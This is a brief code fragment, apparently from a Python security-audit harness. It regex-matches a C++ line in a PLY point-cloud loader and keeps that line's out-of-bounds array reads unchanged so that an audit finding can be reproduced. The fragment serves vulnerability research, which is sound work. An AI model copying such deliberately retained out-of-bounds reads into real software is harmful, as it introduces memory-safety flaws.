    # (the sink of Finding 1). We keep the read expressions verbatim and only
    # replace the PointCloud accessor writes with a volatile sink, since the
    # BKE point-cloud API is not linked into this harness. The reads -
    # including their out-of-bounds indices - are unchanged.
    m = re.search(
        r"radiance_base\[i\] = float4\(ply_f_dc\[0\]\[i\], ply_f_dc\[1\]\[i\],"
        r" ply_f_dc\[2\]\[i\], ply_opacity\[i\]\);",
        gsplat,
    )
